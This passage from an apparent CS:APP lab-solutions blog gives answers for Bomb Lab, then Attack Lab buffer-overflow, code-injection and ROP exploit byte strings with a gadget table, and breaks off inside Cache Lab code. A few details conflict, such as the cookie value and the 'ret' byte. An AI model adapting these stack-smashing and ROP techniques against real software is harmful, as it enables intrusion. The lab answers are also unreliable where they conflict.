<li><code>%rcx</code>: the forth argument.</li>
<li><code>%r8</code>: the fifth argument.</li>
<li><code>%r9</code>: the sixth argument.</li>
</ul>
<p>More arguments are stored in stack. Know at which positions these
arguments are stored in stack and you'll get the answer!</p>
<p><strong>Phase 3</strong></p>
<p>This function reads two integers and switches to the address
accroding to the first integer. If the destination address has a value
same as the second integer, the phase passes.</p>
<p>This phase has multiple answers. You can choose one of the
followings:</p>
<ul>
<li><code>0 207</code></li>
<li><code>1 311</code></li>
<li><code>2 707</code></li>
<li><code>3 256</code></li>
<li><code>4 389</code></li>
<li><code>5 206</code></li>
<li><code>6 682</code></li>
<li><code>7 327</code></li>
</ul>
<p><strong>Phase 4</strong></p>
<p>The key is to decode <code>func4(x, s, e)</code> and understand it
returns some numbers of steps to find <code>x</code> between
<code>[s, e]</code> using binary search. <code>s=0</code> and
<code>e=14</code>. The function returns <code>0</code> if it finds
<code>x</code> in the very first step. So <code>x=7</code>.</p>
<p><strong>Phase 5</strong></p>
<p>This phase executes the following steps:</p>
<ul>
<li>The answer string length is 6.</li>
<li>Reads a string from <code>0x4024b0</code> and compares it to the
string at <code>0x40245e</code>, which is <code>flyers</code>.</li>
<li>The string at <code>0x4024b0</code> is
<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>.</li>
<li>The indices respectively for <code>f</code>, <code>l</code>,
<code>y</code>, <code>e</code>, <code>r</code>, <code>s</code> at
<code>0x4024b0</code> is 9, 15, 14, 5, 6, 7. The hex representations are
<code>9</code>, <code>f</code>, <code>e</code>, <code>5</code>,
<code>6</code>, <code>7</code>.</li>
<li>Find in the ASCII table those characters whose low hex
representation is <code>9</code>, <code>f</code>, <code>e</code>,
<code>5</code>, <code>6</code> and <code>7</code>. So there are multiple
possible answers.</li>
</ul>
<p><strong>Phase 6</strong></p>
<p>This is the most difficult phase (including the secret one), in terms
of it's length of assembly... Be patient and take a careful look at the
assembly. You'll find this phase does the following things:</p>
<ul>
<li>It reads six integers and stores them in stack from the bottom
up.</li>
<li>Each integer is different and all are smaller or equal than 6.</li>
<li>Subtracts each integer from 7. For example, 6 turns into 1.</li>
<li>According to the result integer, this function jumps to the target
address from <code>0x6032d0</code> and reads the value. This value is
also an address. The results are stored from <code>%rsp+32</code> to
<code>%rsp+72</code>, amounting to totally eight addresses.</li>
<li>Sets <code>*(*(%rsp+t)+8)=*(%rsp+t+8)</code>, where
<code>t=32, 3a, 42, ..., 6a</code>. For <code>t=72</code>, the target
value is zero.</li>
<li>It actually implements a linked list, likely implemented as follows:
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct node {</span><br><span class="line">  int value;</span><br><span class="line">  node* next;</span><br><span class="line">};</span><br></pre></td></tr></table></figure></li>
<li>This linked list has a list of non-ascending values.</li>
<li>Find the indices in a non-ascending order and restore the input
indices.</li>
</ul>
<p><strong>Secret Phase</strong></p>
<p>Disassembling the <code>phase_defused</code> function and you will
find a secret <code>secret_phase</code> function. This is the hidden
phase of this lab. The <code>secret_phase</code> function does:</p>
<ul>
<li>Receives an integer less or equal than 1001.</li>
<li>Calls function <code>fun7(int* s, int x)</code> and returns 2.</li>
<li>The <code>fun7(int* s, int x)</code> function receives a pointer
<code>s</code> to a binary search tree node and finds value
<code>x</code> in the tree.</li>
<li>Your goal is to find in this tree a value that returns 2, according
to the calculation rules.</li>
</ul>
<p>This binary search tree node looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">         36</span><br><span class="line">       /    \</span><br><span class="line">      /      \</span><br><span class="line">     /        \</span><br><span class="line">    8          50</span><br><span class="line">   / \       /    \</span><br><span class="line">  6   22    45    100</span><br><span class="line"> / \  / \   / \   / \</span><br><span class="line">1  7 20 35 40 47 99 1001</span><br></pre></td></tr></table></figure>
<h1 id="lab-3-attack-lab">Lab 3: Attack Lab</h1>
<p>This lab asks you to construct exploits to have the function output
specific strings. Before start, make sure to take a glance at the <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/attacklab.pdf">handout</a>, which has
detailed instructions for this lab. Remember to use <code>-Og</code> to
compile the <code>.s</code> file and use <code>objdump -d</code> to
generate byte codes.</p>
<p><strong>Phase 1</strong></p>
<p>In the <code>getbuf()</code> function, <code>%rsp</code> has an
address of <code>0x5561dc78</code> and the return address is located at
<code>%rsp+0x28</code>, which is <code>0x5561dca0</code>. To call the
<code>touch1()</code> function, you should set the return address as the
address of <code>touch1()</code>, that is, <code>0x4017c0</code>.</p>
<p>The input to <code>ctarget</code> is thus:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>The first 40 bytes are arbitrary except <code>\n</code>.</p>
<p><strong>Phase 2</strong></p>
<p>In this phase, you should put <code>0x591997fa</code> into
<code>%rdi</code> and jump to <code>0x4017ec</code> to execute function
<code>touch2()</code>.</p>
<p>The first step is to write a <code>.s</code> file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>Then generate its byte codes:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 // movq $0x59b997fa, %rdi</span><br><span class="line">68 ec 17 40 00       // pushq $0x4017ec</span><br><span class="line">c0                   // ret</span><br></pre></td></tr></table></figure>
<p>Write the input exploit file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">48 c7 c7 fa 97 b9 59 68  // Address 0x5561dc90, return here to execute instructions</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">90 dc 61 55 00 00 00 00  // Destination address</span><br></pre></td></tr></table></figure>
<p><strong>Phase 3</strong></p>
<p>Note that in this phase, the content in the stack may be overwritten
by function <code>hexmatch()</code>. So you must write the content in
some high location of the stack.</p>
<p>The assembly code is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>The generated byte codes are:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55  // movq $0x5561dca8, %rdi</span><br><span class="line">68 fa 18 40 00        // pushq $0x4018fa</span><br><span class="line">c3                    // ret</span><br></pre></td></tr></table></figure>
<p>The input exploit is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 // Address 0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 // Destination address</span><br><span class="line">35 39 62 39 39 37 66 61 // Address 0x5561dca8, string "59b997fa"</span><br></pre></td></tr></table></figure>
<p><strong>Phase 4</strong></p>
<p>In this phase, you should construct two gadgets, one for moving data
<code>0x59b997fa</code> into some register like <code>%rax</code>, and
the other one for moving <code>%rax</code> to <code>%rdi</code> as the
argument into the function. Last, you should return to function
<code>touch2()</code>.</p>
<p>You can find a function which contains the desired byte codes and
returns to that location. The first gadget uses the function
<code>addval_219</code> and the second function is
<code>setval_426</code>. You can choose other functions if
applicable.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00  // Jump to middle of function addval_219 and perform pop</span><br><span class="line">fa 97 b9 59 00 00 00 00  // cookie value 0x59b997fa, popped to %rax </span><br><span class="line">c5 19 40 00 00 00 00 00  // Jump to middle of function setval_426 and perform mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00  // Return to touch2()</span><br></pre></td></tr></table></figure>
<p>Here is a full list of decoded byte codes for all functions in
<code>farm.c</code>. Use Ctrl+F to search the byte patterns you
want.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x40199a: b8 fb 78 90 90 c3</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_142</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019a0: 8d 87 48 89 c7 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_273</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019a7: 8d 87 51 73 58 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_219</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ae: c7 07 48 89 c7 c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_237</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019b5: c7 07 54 c2 58 92 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_424</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019bc: c7 07 63 48 8d c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_470</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019c3: c7 07 48 89 c7 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_426</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ca: b8 29 58 90 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_280</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019d6: 48 8d 04 37 c3</span></span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">add_xy</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019db: b8 5c 89 c2 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_481</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019e1: c7 07 99 d1 90 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_296</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019e8: 8d 87 89 ce 78 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_113</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ef: 8d 87 8d d1 20 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_490</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019f6: b8 89 d1 48 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_226</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019fc: c7 07 81 d1 84 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_384</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a03: 8d 87 41 48 89 e0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_190</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a0a: c7 07 88 c2 08 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_276</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a11: 8d 87 89 ce 90 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_436</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a18: b8 48 89 e0 c1 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_345</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a1e: 8d 87 89 c2 00 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_479</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a25: 8d 87 89 ce 38 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_187</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a2c: c7 07 81 ce 08 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_248</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a33: b8 89 d1 38 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_159</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a39: 8d 87 c8 89 e0 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_110</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a40: 8d 87 89 c2 84 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_487</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a47: 8d 87 48 89 e0 c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_201</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a4e: b8 99 d1 08 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_272</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a54: b8 89 c2 c4 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_155</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a5a: c7 07 48 89 e0 91 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_299</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a61: 8d 87 89 ce 92 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_404</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a68: b8 89 d1 08 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_311</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a6e: c7 07 89 d1 91 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_167</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a75: c7 07 81 c2 38 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_328</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a7c: c7 07 09 ce 08 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_450</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a83: 8d 87 08 89 e0 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_358</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a8a: 8d 87 89 c2 c7 3c c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_124</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a91: b8 88 ce 20 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_169</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a97: c7 07 48 89 e0 c2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_181</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a9e: 8d 87 89 c2 60 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_184</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401aa5: b8 8d ce 20 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_472</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401aab: c7 07 48 89 e0 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_350</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br></pre></td></tr></table></figure>
<p><strong>Phase 5</strong></p>
<p>Here is how you should think to solve this phase:</p>
<ul>
<li>Function <code>touch3(const char*)</code> receives an address as the
argument. So you should prepare an address value in
<code>%rdi</code>.</li>
<li>This address value should come from <code>%rsp</code>. An intuitive
way is use <code>mov %rsp, %rax</code>.</li>
<li>However, the cached <code>%rsp</code> value is not allowed to store
the string value because it will be immediately transmitted to
<code>PC</code> as the address of the next instruction. It must be a
valid address.</li>
<li><code>farm.c</code> provides a function
<code>add_xy(long, long)</code>. It can be leveraged to offset the value
of <code>%rsp</code>.</li>
<li>The returned value of <code>add_xy(long, long)</code> is the address
where the string is actually stored. It lies at the highest position of
our input.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00  // mov %rsp, %rax</span><br><span class="line">c5 19 40 00 00 00 00 00  // mov %rax, %rdi</span><br><span class="line">ab 19 40 00 00 00 00 00  // pop %rax (0x48 is the offset)</span><br><span class="line">48 00 00 00 00 00 00 00  // (popped offset)</span><br><span class="line">42 1a 40 00 00 00 00 00  // movl %eax, %edx</span><br><span class="line">69 1a 40 00 00 00 00 00  // movl %edx, %ecx</span><br><span class="line">27 1a 40 00 00 00 00 00  // movl %ecx, %esi</span><br><span class="line">d6 19 40 00 00 00 00 00  // call add_xy</span><br><span class="line">c5 19 40 00 00 00 00 00  // mov %rax, %rdi</span><br><span class="line">fa 18 40 00 00 00 00 00  // call touch3</span><br><span class="line">35 39 62 39 39 37 66 61  // string "59b997fa"</span><br></pre></td></tr></table></figure>
<h1 id="lab-4-architecture-lab">Lab 4: Architecture Lab</h1>
<h1 id="lab-5-cache-lab">Lab 5: Cache Lab</h1>
<p>Make sure you read the <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/cachelab.pdf">handout</a> before dong
this lab.</p>
<p><strong>Part A</strong></p>
<p>Code for part A <code>csim.c</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 